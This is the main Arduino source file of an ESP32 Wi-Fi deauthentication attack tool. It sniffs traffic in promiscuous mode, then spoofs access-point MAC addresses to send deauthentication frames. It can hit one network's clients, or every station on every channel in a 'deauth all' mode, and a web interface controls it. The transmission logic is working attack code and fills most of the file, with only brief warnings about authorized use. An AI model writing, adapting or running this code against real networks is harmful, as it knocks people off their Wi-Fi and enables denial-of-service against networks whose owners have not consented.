// main.ino
// This ties together the components for the ESP32 2.4GHz Deauther.
// Created by killitall

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <WebServer.h>

// Include our custom header files
#include "definitions.h"   // For macros and constants
#include "type.h"          // For structure definitions
#include "wifi_manager.h"  // For Wi-Fi initialization and scanning functions
#include "web_interface.h" // For web server initialization and handling functions
#include "deauth_core.h"   // For start_deauth and stop_deauth function declarations

// --- Global Variables ---
// Declared here as they are shared across multiple files (main .ino, deauth_core.cpp, web_interface.cpp)
WebServer server(80); // Web server instance on port 80
int num_networks; // Stores the number of scanned networks
deauth_frame_t deauth_frame; // Used for building deauthentication frames (defined in type.h)
int deauth_type = DEAUTH_TYPE_NONE; // Tracks the current type of deauth attack
int eliminated_stations; // Counter for stations deauthenticated in single mode
int curr_channel = 1; // Used for channel hopping in "deauth all" mode

// --- External Variable (defined in type.h, used here) ---
extern const wifi_promiscuous_filter_t filt; // The promiscuous filter


// --- External Function Declarations (from ESP-IDF or other sources) ---
// These remain external as they are part of the ESP-IDF/system libraries.
extern esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

// Required external function likely for ESP-IDF API compatibility with promiscuous mode.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0; // Functionally useless body, but declaration might be needed.
}


// --- Deauth Promiscuous Mode Sniffer Function ---
// This function is called by the ESP-IDF Wi-Fi driver when packets are received in promiscuous mode.
// IRAM_ATTR ensures this function is placed in IRAM for faster execution, important for callbacks.
// This function contains the core logic for identifying targets and potentially sending deauth frames.
IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  // !!! WARNING: The logic within this sniffer function is critical
  // !!! for identifying targets and sending deauthentication frames.
  // !!! Improper implementation can lead to network disruption.
  // !!! Ensure your logic here is precise and only targets intended devices
  // !!! within authorized environments.

  // Cast the received buffer to the appropriate packet structure
  const wifi_promiscuous_pkt_t *raw_packet = (const wifi_promiscuous_pkt_t *)buf; // Cast to const
  // Basic validation for packet type (optional, but good practice)
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return; // Only process Data and Management frames

  // Ensure payload is not null before accessing
  if (!raw_packet->payload) return;

  // The sniffer logic expects to cast raw_packet->payload to wifi_packet_t*
  // and then access packet->hdr (mac_hdr_t).
  const wifi_packet_t *packet = (const wifi_packet_t *)raw_packet->payload; // Cast to const
  const mac_hdr_t *mac_header = &packet->hdr; // Access the MAC header

  // Calculate packet length excluding the MAC header
  // Note: This calculation might need adjustment depending on the exact structure definitions
  // and padding, but let's keep it as is for now.
  const int16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  // Basic validation for packet length
  if (packet_length < 0) return;

  // --- YOUR DEAUTHENTICATION LOGIC GOES HERE ---
  // This is where you implement the core of the deauth attack.
  // based on the received packet (mac_header, packet_length).

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    // In single AP mode, you are looking for frames *from* the target AP (mac_header->addr2 matches deauth_frame.sender)
    // and you want to deauthenticate the station that sent the frame *to* that AP (mac_header->addr1 if it's a STA).
    // However, the original code's logic here seemed to use mac_header->addr1 as the station to deauth
    // if mac_header->addr2 matched the target AP (deauth_frame.sender). This implies you're deauthenticating
    // whatever the AP is talking *to*. This might not be the intended behavior (deauthenticating clients of the AP).
    // A more typical approach is to find packets *from* clients (check frame control subtype, check mac_header->addr2)
    // and then send deauth to *that client* (deauth_frame.station = client MAC) *from the spoofed AP MAC* (deauth_frame.sender/access_point).

    // --- Original Sniffer Logic (Carefully Review and Modify as Needed) ---
    // If targeting a single AP, check if the packet's source address (addr2) is the target AP (deauth_frame.sender)
    // Note: A received frame's addr2 is its source, addr1 is its destination.
    if (memcmp(mac_header->addr2, deauth_frame.sender, 6) == 0) {
      // If it is, copy the station's MAC (addr1 is the destination of the packet FROM the AP)
      // and send deauth frames TO that station.
      memcpy(deauth_frame.station, mac_header->addr1, 6); // This copies the DESTINATION of the AP's packet
      DEBUG_PRINTF("Identified potential station %02X:%02X:%02X:%02X:%02X:%02X from target AP traffic.\n",
                   deauth_frame.station[0], deauth_frame.station[1], deauth_frame.station[2], deauth_frame.station[3], deauth_frame.station[4], deauth_frame.station[5]);

      // --- Send Deauth Frames (IMPLEMENT CAREFULLY) ---
      // This part sends the actual deauth packets.
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        // Send deauth frames using the raw transmit function
        // Transmit from the AP interface? Or STA? This depends on your ESP-IDF setup and intent.
        // Typically, you spoof the AP's MAC and send from the STA interface.
        // Using WIFI_IF_STA is usually correct when spoofing.
        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
      }
      eliminated_stations++; // Increment counter for eliminated stations
       #ifdef LED
        BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION); // Placeholder - avoid delay in IRAM_ATTR
       #endif
    }
     // --- End of Original Sniffer Logic for Single Mode ---

  } else if (deauth_type == DEAUTH_TYPE_ALL) {
    // In "deauth all" mode, you are looking for frames *from* stations (`addr2`)
    // directed *to* an AP (`addr1` == `bssid`).
    // You ignore broadcast/multicast destinations (`FF:FF:FF:FF:FF:FF`).
    // Once a station frame is seen, you construct a deauth frame *to* that station
    // *from* its AP (spoofing the AP's MAC).

    // --- Original Sniffer Logic (Carefully Review and Modify as Needed) ---
    if ((memcmp(mac_header->addr1, mac_header->bssid, 6) == 0) && (memcmp(mac_header->addr1, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      // We found a frame from a station (addr2) to an AP (addr1 which is also bssid).
      // Copy source (station - addr2), destination (AP - addr1), and sender (AP - bssid) MACs for the deauth frame.
      // The deauth frame needs:
      // - destination: the station's MAC (from received packet's addr2)
      // - sender: the AP's MAC (from received packet's addr1)
      // - bssid: the AP's MAC (from received packet's bssid, which should equal addr1)
      memcpy(deauth_frame.station, mac_header->addr2, 6); // Target the station that sent the packet
      memcpy(deauth_frame.access_point, mac_header->addr1, 6); // AP is the destination of the received packet
      memcpy(deauth_frame.sender, mac_header->addr1, 6); // Sender of the deauth frame is the AP's BSSID

      DEBUG_PRINTF("Identified station %02X:%02X:%02X:%02X:%02X:%02X communicating with AP %02X:%02X:%02X:%02X:%02X:%02X.\n",
               deauth_frame.station[0], deauth_frame.station[1], deauth_frame.station[2], deauth_frame.station[3], deauth_frame.station[4], deauth_frame.station[5],
               deauth_frame.access_point[0], deauth_frame.access_point[1], deauth_frame.access_point[2], deauth_frame.access_point[3], deauth_frame.access_point[4], deauth_frame.access_point[5]);

      // --- Send Deauth Frames (IMPLEMENT CAREFULLY) ---
      // This part sends the actual deauth packets.
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        // Send deauth frames from STA interface when targeting all stations on different channels
         esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
      }
       #ifdef LED
        BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION); // Placeholder - avoid delay in IRAM_ATTR
       #endif
    }
     // --- End of Original Sniffer Logic for All Mode ---
  }

  // Note: Printing/delaying inside an IRAM_ATTR function (like sniffer) should
  // be minimized or avoided if possible as it can cause timing issues or crashes.
  // Consider setting a flag to trigger actions outside the sniffer if needed.
}


// --- Utility Functions (Placeholder for blink_led if LED is defined) ---
#ifdef LED
// Define blink_led here if you are using an LED and it wasn't defined elsewhere
// Example (requires digitalio):
/*
void blink_led(int num_times, int blink_duration) {
  int delay_ms = blink_duration / (2 * num_times);
  for (int i = 0; i < num_times; i++) {
    digitalWrite(LED, HIGH);
    delay(delay_ms);
    digitalWrite(LED, LOW);
    delay(delay_ms);
  }
}
*/
// If you don't need this functionality or implement it elsewhere, remove this.
#endif // LED


// --- Standard Arduino Functions ---

void setup() {
#ifdef SERIAL_DEBUG
  Serial.begin(115200); // Initialize serial communication for debugging
  Serial.println("ESP32-Deauther Starting...");
#endif

#ifdef LED
  pinMode(LED, OUTPUT); // Initialize LED pin as output (LED define from definitions.h)
  // Optional: Blink LED once on startup (requires blink_led function and defines)
  // BLINK_LED(1, 500); // Placeholder - needs blink_led definition if used
#endif

  // --- Wi-Fi Initialization ---
  // Start the SoftAP for the web interface
  // Use the wifi_manager function to handle this
  wifi_init_ap();

  // Start the web interface - this will also perform an initial scan
  // Use the web_interface function to handle this
  start_web_interface();

   DEBUG_PRINTF("Setup complete. Web server started.\n");
}

void loop() {
  // The loop manages different modes of operation (channel hopping for deauth all, or web server handling)
  if (deauth_type == DEAUTH_TYPE_ALL) {
    // If in "deauth all" mode, cycle through Wi-Fi channels
    if (curr_channel > CHANNEL_MAX) curr_channel = 1; // Reset channel if max is reached (CHANNEL_MAX from definitions.h)
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE); // Set the Wi-Fi channel
    curr_channel++; // Move to the next channel
    delay(10); // Small delay to yield control and prevent watchdog timeouts
    // Note: While in DEAUTH_TYPE_ALL, the web server handlers are NOT called in this loop structure.
    // The web server is also stopped in handle_deauth_all.
    // To stop this mode, a hardware reset is likely required unless a timer or
    // other background mechanism is used to check for a stop condition.
  } else {
    // If not in "deauth all" mode (e.g., idle or DEAUTH_TYPE_SINGLE),
    // handle incoming web client requests.
    // Use the web_interface function to handle this
    web_interface_handle_client();
    // Note: The sniffer function (when enabled by start_deauth) runs in the background
    // regardless of what is happening in the loop, as long as promiscuous mode is on.
    // The frequency of sniffer calls is handled by the ESP-IDF Wi-Fi driver.
  }

  // Add a small delay here if the loop finishes very quickly, to prevent watchdog timeouts.
  // A delay of 1ms is often sufficient if there's no other blocking code.
  // delay(1); // Optional: Add a small delay
}

// Note: Web server handler functions (handle_root, handle_deauth, etc.)
// and the redirect_root function are defined in web_interface.cpp.
// Utility functions like getEncryptionType are defined in wifi_manager.cpp.
